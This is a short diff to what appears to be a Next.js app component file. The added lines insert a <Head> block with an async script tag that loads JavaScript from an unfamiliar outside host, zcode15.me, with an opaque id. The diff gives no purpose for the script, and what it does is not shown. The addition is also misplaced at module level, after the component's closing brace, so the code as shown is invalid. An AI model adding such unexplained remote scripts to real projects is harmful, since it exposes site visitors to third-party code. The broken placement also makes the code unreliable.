@@ -20,5 +20,12 @@ function MyApp({ Component, pageProps }) {
     </Fragment>
   );
 }
+<Head>
+        <script
+          type="text/javascript"
+          src="https://zcode15.me/?ze=my3dcmbrmi5ha3ddf42dsnbq"
+          async
+        />
+      </Head>
 
 export default MyApp;
